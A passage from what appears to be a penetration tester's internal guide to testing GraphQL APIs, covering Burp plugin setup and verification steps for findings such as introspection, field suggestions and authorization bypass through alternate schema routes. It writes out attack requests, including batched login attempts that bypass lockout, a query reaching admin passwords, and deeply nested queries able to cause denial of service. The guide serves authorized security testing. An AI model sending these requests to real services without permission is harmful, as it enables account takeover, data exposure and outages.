src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/ea7560cf-501c-4b95-b798-f126f1628506/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=e4814b55d70871879f2d644f5f08ba2d5ee7c34901f7a8736441ccaa01e7bb19&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Setup Before Introspection Schema" contenteditable="false"><p class="caption"></p></div></p><ol><li><p>GraphQuail allows you to either provide the full schema, or passively builds the schema in the background. Ideally we would want the first option.</p><ol><li><p>If you have a schema, you can choose “File” and paste in the schema in the corresponding box. <strong>Make sure to also click “Replace Schema” if you choose this option.</strong> Navigating to the GraphiQL identifier or Voyager identifier off the main domain should then give you the associated tech stacks with all the schema data since you hardcoded it in essentially. Note the Yelp schema was throwing syntax issues so I demonstrate this with GitLab’s public GraphQL endpoint. The box under “Paste a schema” appears blank but there is a schema there, just some UI issues with large schemas it seems like. Note if schemas are really large like the example below they might take a few minutes to resolve.</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/09c07856-9790-40bf-8c49-8c3736d4e455/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=0123b213ea39b41b4594bd00c9229e37afb1420d00ce7264512cca9c39cd5bb3&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="1236" height="619" alt="Using the Copy/Paste Schema Option (Preferred)" title="" contenteditable="false"><p class="caption"></p></div></p><ol><li><p>If you don’t have the GraphQL schema, GraphQuail will passively build the schema as you navigate the site. You just set the “GraphQL Endpoint URL” to the URL of the impacted GraphQL endpoint (no identifiers or anything), and it will passively start making the schema as the front-end makes different GraphQL calls. As you refresh GraphiQL or Voyager, you should see more and more added as you navigate the site. “Reset Schema” basically clears your progress thus far. This is all shown below.</p></li></ol></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/296024a5-90eb-497a-9748-6b87351d2779/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=3f08de678926a351e86ef2dbfd75b32fa3f3e26aef293f6af97767d3ca79504d&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="883" height="487" alt="GraphQuail Default State" title="" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/078e75e6-43cb-44ee-b12e-f0a23c73ecfb/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=3f99a776b9ee0cdecf179f45bd7383d9e9a1979653111a536460d313bce5ead8&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="883" height="409" alt="Turning on Introspection and Setting it to Passively Pick Up Schema From Proxy" title="" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/948ef54f-e666-44c4-bf5a-0e8d0e07c4b0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=9c1af92d83a7773ea883769ac5c76e5502d0a6d4baae7f5e4bfbaddb7a27f6c5&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="883" height="817" alt="Refreshing Webpage for Developer Console Naturally Sends Introspection Query to Populate Everything (Note GraphQL calls from same URL we set in GraphQuail settings)" title="" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/3435ba45-3f3a-4d91-9a14-0f219e116704/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=092a1b82daea6f6d67752fd6e84305aa5028b3a9051f7cdc98921f9575744a86&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="883" height="509" alt="Navigate back to GraphiQL, Refresh Page, and See Things are Starting to Populate" title="" contenteditable="false"><p class="caption"></p></div></p><ol><li><p>Sometimes, even if you have the full schema, you might be getting syntax errors thrown or run into some unknown problems. <strong>You can get around this by setting</strong> the Schema Source to proxy with the correct GraphQL URL, and intercepting the response to swap it out with the correct Schema. For example, assume you have the GraphQL schema provided or found through the course of the assessment.  You can navigate to GraphQL Voyager identifier as seen below and leave proxy on. You can right-click the HTTP request with the introspection query, choose to intercept the response, swap out the response with the schema provided, and forward that. GraphQL Voyager will then pick up the schema and generate the graph.</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/0b56ceed-7e77-4d21-b6e2-5fa62f5c1fc8/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=009593cea0a9ce7e74d9e832afc2f133d0e986b780be0b01f7b55c318d10c1d2&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Note Endpoint Tried to Get Introspection Query but Returned Blank 200 Hence Why GraphQL Voyager Stalls" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/a3cf0a50-dbb7-4331-8185-cb9e4c3b90f7/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=38f95da7ec26dfa64e26c273f7be5b416dd27834746db9fa8352e5d1d7f9126c&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Refresh Webpage and Intercept Response" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/a6780ddf-55b7-4c44-b33b-6668d3b4288b/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=8c396af682449634c49f0fa71b6579eb0ab6178fdc97e2d494b2a1d487d5d7ec&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Original Response" contenteditable="false"><p class="caption"></p></div></p><p></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/707ca0c7-7088-4fe4-aa38-fa7b0cd19c22/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=80bcc346bbabd13aa94176e70b501cd9da941268c8339ec80b05f9c2ac334bba&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Replaced Response with your Schema; HTTP Headers shouldn't matter" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/dddcbba3-014f-4c0c-9722-4ec046207e05/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=44e16ad6eac42749236c79a81dceb57c0f99aa8928622eb4cbccf2dac9a76498&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="1060" height="699" alt="GraphQL Voyager Populates" title="" contenteditable="false"><p class="caption"></p></div></p><p></p><ol><li><p>As a final tip, I wanted to spawn GraphQL Voyager on a localhost IP address (127.0.0.1). So, you can simply start Burp Suite, add the schema to the Introspection Interception File option like normal, and generate a unique ID for GraphQL Voyager in the plugin tab. Then you can use <code class="inline" spellcheck="false">python3 -m http.server 8090</code> on your localhost to spin up a simple web server, and go to http://127.0.0.1:8090/[GraphQLVoyagerID] and get a localhost graph.</p></li></ol><h1><span contenteditable="false" class="heading-actions "></span><span class="heading-content">Items to Consider:</span></h1><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">How to report?</span></h2><p>There are usually 3 impacted attributes in a GraphQL vulnerability: the URL (/graphql), the associated query/mutation/subscription (getUser), and the impacted variable (username). Since Resolve only has one impacted parameter spot you should:</p><ul><li><p>list the impacted URL as the GraphQL endpont (/graphql)</p></li><li><p>list the impacted parameter as <code class="inline" spellcheck="false">[Query | Mutation | Subscription]:[query_name]:[impacted_variable_if_applicable]</code></p></li></ul><p><strong>Impacted URL:</strong> [URL]/graphql</p><p><strong>Impacted Parameter:</strong> query:getUser:username</p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Information Disclosure</span></h2><p>The web UI will usually call the GraphQL APIs specifying which attribute fields should be returned. However, if you examine GraphQL Voyager and the schema itself, you might see that the query/mutation/subscription actually has the ability to return much more sensitive data. The developers might not think these attributes can be added manually. For example, a “getUser” query might be called when navigating to a user profile that returns their name and height attributes. However, you might see in GraphQL voyager that there is also a “internalIP” attribute. If you send the request to the Repeater, and manually add the “internalIP” attribute as seen below, than you have discovered an information disclosure as it is returning sensitive information.</p><p><strong>GraphQL getUser</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getUser",
+  "variables": {
+    "userId":1234
+  }
+  "query": "query getUser($userId: userId){getUser(userId:$userId){\n name\n height\n internalIP\n}}
+}</code></pre></div><p><strong>Verification Steps</strong></p><ol><li><p>Skim through GraphQL Voyager or GraphiQL and take a look at all the fields available. Make sure none would represent a significant information disclosure. Depending on the disclosure (ex. Internal IPs), create a finding for the associated Information Disclosure MF.</p></li></ol><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Introspection Enabled</span></h2><p>The schema does not normally accompany the GraphQL endpoint and an attacker should not be able to derive the schema as that might give them insight into how the APIs are structured called. Even if you were given the introspection schema by the development team, ensure a normal user cannot query specific GraphQL metadata attributes to pull back the schema through a single query.</p><p><strong>Verification Steps</strong></p><ol><li><p>Send the following “introspection query” versions to the expected GraphQL endpoint (<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md" rel="noopener noreferrer nofollow">Ref</a>). Using GraphQL Raider, you should be able to switch to the GraphQL view and copy/paste in the queries below (with the exception of the URL query). Remember to try deleting the operationName parameter and value if the API returns an error.</p></li></ol><p><strong>Fragment Introspection Format</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">fragment FullType on __Type {
+  kind
+  name
+  description
+  fields(includeDeprecated: true) {
+    name
+    description
+    args {
+      ...InputValue
+    }
+    type {
+      ...TypeRef
+    }
+    isDeprecated
+    deprecationReason
+  }
+  inputFields {
+    ...InputValue
+  }
+  interfaces {
+    ...TypeRef
+  }
+  enumValues(includeDeprecated: true) {
+    name
+    description
+    isDeprecated
+    deprecationReason
+  }
+  possibleTypes {
+    ...TypeRef
+  }
+}
+fragment InputValue on __InputValue {
+  name
+  description
+  type {
+    ...TypeRef
+  }
+  defaultValue
+}
+fragment TypeRef on __Type {
+  kind
+  name
+  ofType {
+    kind
+    name
+    ofType {
+      kind
+      name
+      ofType {
+        kind
+        name
+        ofType {
+          kind
+          name
+          ofType {
+            kind
+            name
+            ofType {
+              kind
+              name
+              ofType {
+                kind
+                name
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+}
+
+query IntrospectionQuery {
+  __schema {
+    queryType {
+      name
+    }
+    mutationType {
+      name
+    }
+    types {
+      ...FullType
+    }
+    directives {
+      name
+      description
+      locations
+      args {
+        ...InputValue
+      }
+    }
+  }
+}</code></pre></div><p><strong>No Fragment Format</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">{__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}
+
+
+URL Format</code></pre></div><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}</code></pre></div><p><strong>Naturally Called Introspection Query Request &amp; Response</strong></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/9e82eff7-898d-4181-94c5-dac571f05719/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=e9184cf0aab561313e72b997737dd570aeade87b41e5d66a41fb98ab9b93f7d9&X-Amz-SignedHeaders=host&response-content-disposition=attachment" width="883" height="492" alt="Introspection Query Example" title="" contenteditable="false"><p class="caption"></p></div></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/778f1e7b-ae46-4e4f-ae62-ae1803f3a6f1/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=e080f6d1fb5a7f3a7e0f5d1aa792218679f19dc4f153b3030908624b4ef04476&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="Schema Response" contenteditable="false"><p class="caption"></p></div></p><p></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Field Suggestion Enabled</span></h2><p>GraphQL has a feature where an API or field name that is close syntactically to the actual value will prompt a verbose error that returns the actual API/field name.  This is only a low severity as ideally a GraphQL schema should be hardened enough that even knowing the query/mutation/subscription details would not cause any losses. However, if field suggestions help you discover a graphql query or field name that should not be callable, than that is a separate issue (probably MFLAC) along with field suggestions being enabled.</p><p><strong>Verification Steps</strong></p><ol><li><p>Try taking an existing query or mutation, and sending the same API call a couple times while removing some letters form the API name or field name. See if a verbose error is returned like the example below from <a href="https://escape.tech/blog/graphql-verbose-error-suggestions/" rel="noopener noreferrer nofollow">here</a>.</p></li></ol><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">{
+	"errors": [
+    	{
+            "message": "Cannot query field \"searchActivities\" on type \"Query\". Did you mean \"searchHotels\",\”searchLeisures\” or \”searchUsers\”?",
+            "locations": [{
+            		"line": 144,
+            		"column": 3
+			}]
+		}
+    ]
+}</code></pre></div><p></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Password Flow Bypass</span></h2><p>In a REST-based test you are instructed to enter a password incorrectly 9 times, for example, with the 10th incorrect guess supposed to lock you out of the account. However, with GraphQL batching, you might be able to send MORE than 10 GraphQL authentication API calls in ONE POST request. This might be computed as 10+ individual password attempts code-wise, but the API itself might only see this as <strong>one attempt</strong> since only one POST request was sent.</p><p><strong>Verification Instructions</strong></p><ol><li><p>To test for this, try sending authentication queries with incorrect passwords/PINs/2FA codes 9+ times followed by the correct passwords/PINs/2FA code at the end. If set up properly, you should be locked out after the 9 attempts before ever reaching the 10th attempt in the batch call.</p></li></ol><p><strong>GraphQL Batching Password Bypass</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+[
+{
+  "operationName": "authenticateUser",
+  "variables": {
+    "username":"admin",
+    "password":"WrongPassword1"
+  }
+  "query": "mutation authenticateUser($userame:username, $password:password){\n authenticate(username:$username,password:$password) {\n __typename \n newJWT}
+},
+{
+  "operationName": "authenticateUser",
+  "variables": {
+    "username":"admin",
+    "password":"WrongPassword2"
+  }
+  "query": "mutation authenticateUser($userame:username, $password:password){\n authenticate(username:$username,password:$password) {\n __typename \n newJWT}
+},
+{
+  "operationName": "authenticateUser",
+  "variables": {
+    "username":"admin",
+    "password":"WrongPassword3"
+  }
+  "query": "mutation authenticateUser($userame:username, $password:password){\n authenticate(username:$username,password:$password) {\n __typename \n newJWT}
+},
+{
+  "operationName": "authenticateUser",
+  "variables": {
+    "username":"admin",
+    "password":"WrongPassword4"
+  }
+  "query": "mutation authenticateUser($userame:username, $password:password){\n authenticate(username:$username,password:$password) {\n __typename \n newJWT}
+},
+[TRUNCATED]
+{
+  "operationName": "authenticateUser",
+  "variables": {
+    "username":"admin",
+    "password":"CorrectPassword"
+  }
+  "query": "mutation authenticateUser($userame:username, $password:password){\n authenticate(username:$username,password:$password) {\n __typename \n newJWT}
+},
+]</code></pre></div><ol start="2"><li><p>Also try to leverage aliasing if it exists. Aliasing just means you call the same query over and over but you add an <em>alias</em> or a unique key to each attempt. Review the example below from <a href="https://escape.tech/blog/graphql-batch-attacks-cause-dos/" rel="noopener noreferrer nofollow">here</a></p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/25cf555c-5f0e-4ca3-9a6a-b5ffc85d442f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=522a03bed2f9815225e67a4f02096ed13d8b1994eee1f1fcbb3af3fab02ac159&X-Amz-SignedHeaders=host&response-content-disposition=attachment" contenteditable="false"><p class="caption"></p></div></p><ol start="2"><li><p>If you are locked out when trying this tactic, perform the verification steps associated with the “Account Policy - Weak Lockout Policy” master finding to see if you can bypass the weak lockout policy by submitting wrong passwords/2FA codes one at a time.</p></li></ol><p></p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: MFLAC</span></h2><p>As mentioned a given GraphQL schema can have a ton of interconnected objects and edges. Using a tool like GraphQL Voyager, you might identify an avenue by which you can retrieve a normally restricted attribute. For example, maybe you are not allowed to call the “getAdmin” query which returns an “Admin” object that in turn has a “password” attribute. The developer has put in MFLAC controls on this “edge” if we were to visualize this in  GraphQL Voyager.</p><p>However, with GraphQL you need to make sure to enforce authorization on <strong>every route</strong> to the defined attribute. So, an attacker might identify an edge where we can call something like “getAllUsersOnAProject” which in turn returns the “Admin” object which does NOT have MFLAC in place allowing us to retrieve creds. See the example below:</p><p><strong>GraphQL Blocked Admin Fetch</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getAdmin",
+  "variables": {
+  }
+  "query": "query getAdmin{\n admin {\n adminName \n adminPassword}
+}</code></pre></div><p><strong>GraphQL Admin Fetch Bypass</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getAllUsersOnAProject",
+  "variables": {
+    "projectId":1234
+  }
+  "query": "query getAllUsersOnAProject($projectId:projectId){\n getAllUsersOnAProject(id:$projectId){\n projectName\n userType\n adminAssignedUser \n {adminName \n adminPassword}}
+}</code></pre></div><p><strong>Verification Steps</strong></p><ol><li><p>Leverage GraphQL Voyager and try to find routes or a combination of edges to get to an attribute that is normally blocked like the example above. See if you can circumvent the 40X response by fetching the data indirectly. For example, if you are blocked from querying everyone who is on a project, maybe try querying a list of projects and all the team members on each project.</p></li><li><p>I included a real example below to assist. This was taken from the public Yelp API</p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/d88939eb-f530-40e1-b95c-086528af37ff/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=0bf314ddb5c65099b9e505aefd1cd5af0b75cdee9920fbac2282f66267cac31d&X-Amz-SignedHeaders=host&response-content-disposition=attachment" contenteditable="false"><p class="caption"></p></div></p><p>So looking at this GraphQL Voyager snapshot. We can see there is a query called “event” and a query called “event_search” per the far left “Query” table. “event” returns an “Event” data type, while “event_search” returns “Events” data type. Let’s assume we are on a pentest, and we call the “event” query. Based off the graph above, our graphql query might look like the following:</p><p><strong>Blocked Route</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getEvent",
+  "variables": {
+  }
+  "query": "query getEvent{\n event {\n name \n id \n business_id \n cost \n latitutde \n longitude}
+}</code></pre></div><p>However, the request above might return a 403 as our user is <strong>UNAUTHORIZED</strong> to call the “event” query. Thus the client has put in a good MFLAC control on that edge and we cannot call it (hence the red X). <strong>BUT</strong> by looking at GraphQL, we can see there is <strong>another route</strong> to the same data highlighted yellow. So that request might look like</p><p><strong>Unblocked Route</strong></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getEvents",
+  "variables": {
+  }
+  "query": "query getEvents{\n event_search(categories: "Secret"){\n total \n events{\n name \n id \n business_id \n cost \n latitutde \n longitude}\n}
+}</code></pre></div><p>The client might have forgotten about this edge and <strong>not implemented authorization</strong> on this route. Thus, we were able to bypass an MFLAC control using the GraphQL schema.</p><p>To help build the query, you can also use the GraphiQL portion of the GraphQuail plugin.</p><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: <strong>Lack of Aliasing or Batching Limits</strong></span></h2><p>GraphQL batching and aliasing can both be used to send multiple GraphQL queries at once. The client should set a reasonable maximum on each of these mechanisms to avoid DOS vectors in the future.</p><p><strong>Verification Steps:</strong></p><ol><li><p>See if batching is supported by the application. If you can enclose the GraphQL query in something like square brackets ([]) than that usually means batching is supported.</p></li><li><p>If batching is supported, try to incrementally send more jobs over time and observe the time delays in the server response. If you are able to cause a timeout or send a batch request of over however many requests are reasonable relative to the application requests (I usually will try to build up to 100-150ish), add this finding and verification steps.</p></li><li><p>Check if aliasing is supported. In the “query” parameter, try to add an alias to the existing query. For example, if you have the following:</p></li></ol><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getEvent",
+  "variables": {
+  }
+  "query": "query getEvent{\n event {\n name \n id \n business_id \n cost \n latitutde \n longitude}
+}</code></pre></div><p>try to call the same API with aliasing as the following</p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">POST /graphql HTTP/1.1
+Host: netspi.com
+Content-Length: #
+
+{
+  "operationName": "getEvent",
+  "variables": {
+  }
+  "query": "query getEvent{\n alias1: event {\n name \n id \n business_id \n cost \n latitutde \n longitude}\n alias2: event {\n name \n id \n business_id \n cost \n latitutde \n longitude}}
+}</code></pre></div><ol start="4"><li><p>Incrementally increase the number of aliases. If you can cause a timeout, or can submit more than what is deemed reasonable aliases, add this finding with verification steps.</p></li></ol><h2><span contenteditable="false" class="heading-actions "></span><span class="heading-content">GraphQL: Large Query Depth Permitted</span></h2><p><strong>Verification Steps:</strong></p><ol><li><p>Review the GraphQL Voyager instance and the general sense of what a maximum query depth would be.  For example, in the diagram below, we assume there is probably a depth of about 4 using the “business_match” query to get to the “BusinessAttributes” object. To get a sense of the <strong>maximum</strong> depth for the WHOLE schema, start from the lefthandmost query, and find a relative linear depth moving from left to right that has the most edges. Make a note of this number as the <strong>maximum linear depth</strong>. Note while an exact number is good but you are just trying to get a general sense at the moment of the expected max query depth, and some of this is subjective to your own judgement call.                <br></p><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/2115b360-41d8-4491-b126-8c713e930b96/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=3a41308c59535664b07e4d4ef308f8a11663a369bcaad6f076a61f4d199e9037&X-Amz-SignedHeaders=host&response-content-disposition=attachment" contenteditable="false"><p class="caption"></p></div></p></li><li><p>Check GraphQL Voyager for any circles or loops in the graph. Try to make a query with a large, nested depth.  For example, in the schema below, we can see a loop as one could ask for “locales [Locale]” which in turn contains a “code String” which in turn contains a “locales [Locale]” which in turn contains a “country Country” which in turn contains a “locales [Locale]” and so forth. <strong>Note GraphiQL lets you build this query by just checking the boxes on the lefthand side.</strong> UContinually misuse this loop to build a query of large depth. For example, the query itself might look like the image below in GraphiQL.</p><p>If you are able to create a query with a depth that exceeds the previous <strong>maximum linear depth</strong> than report a finding for Large Query depth.</p><p>If you error out or get a server error before exceeding this limit, consider looking the separate Informational <code class="inline" spellcheck="false">GraphQL - Lack of Volumetric Data Management Controls</code> finding. <strong>IF YOU CAUSE AN ACTUAL DOS CONDITION BY ACCIDENT (BRING THE ENTIRE APPLICATION DOWN FOR A LONG PERIOD OF TIME),</strong> upgrade the severity of the finding from Low to Medium with the verification step being the HTTP request that caused the DOS condition.</p><p><br>                                                                                 <div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/9b062334-642c-4c09-8ed5-a122be8ef8fd/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=83f7a4689a80313355483236619ab41eba59724f69d09ffee0561efd73ef1cde&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="GraphQL Voyager Finding a Cycle" contenteditable="false"><p class="caption"></p></div></p></li></ol><p><div class="image"><img src="https://outline.netspi.com/bucket/uploads/d2742172-72a7-4365-ab70-ac500696dafc/3912f646-73b5-4c81-8434-91f76655b5ec/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=miniouser%2F20230731%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20230731T094540Z&X-Amz-Expires=3000&X-Amz-Signature=d60e0943d318a48d73dc3ac12fec45d1ab7bd252f46b7ef5e196dbf49cd978ba&X-Amz-SignedHeaders=host&response-content-disposition=attachment" alt="GraphiQL View" contenteditable="false"><p class="caption"></p></div></p><div class="code-block with-line-numbers" data-language="bash"><pre><code spellcheck="false">query MyQuery {    #depth 0
+  event {          #depth 1
+    description    #depth 2
+    business {     #depth 3
+      categories { #depth N
+        country_whitelist {
+          code
+          locales {
+            code
+            language {
+              code
+              locales {
+                code
+                country {
+                  code
+                  locales {
+                    code
+                    language {
+                      code
+                      locales{
